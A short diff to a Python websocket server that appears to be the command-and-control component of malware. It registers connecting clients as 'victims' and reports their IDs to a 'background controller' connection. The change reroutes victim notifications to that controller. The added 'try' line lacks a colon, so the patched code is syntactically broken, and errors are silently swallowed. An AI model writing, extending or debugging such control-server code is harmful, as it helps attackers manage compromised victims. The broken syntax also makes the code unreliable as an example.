@@ -19,9 +19,14 @@ async def handler(websocket):
     except websockets.ConnectionClosed:
         return
     if first_msg.find("ROLE:BACKROUND")!=-1:
+        global background_controller
         background_controller=websocket
-        for vid in victims.keys():
-            await controller.send(f"EXISTING_VICTIM:{vid}")
+        try
+            for vid in victims.keys():
+                if background_controller is not None:
+                    await background_controller.send(f"EXISTING_VICTIM:{vid}")
+        except:
+            pass
     elif first_msg.find(":VICTIM-777777") !=-1:
         victim_id = first_msg[:first_msg.find(":VICTIM-777777")]
         victims[victim_id] = websocket
@@ -110,4 +115,5 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
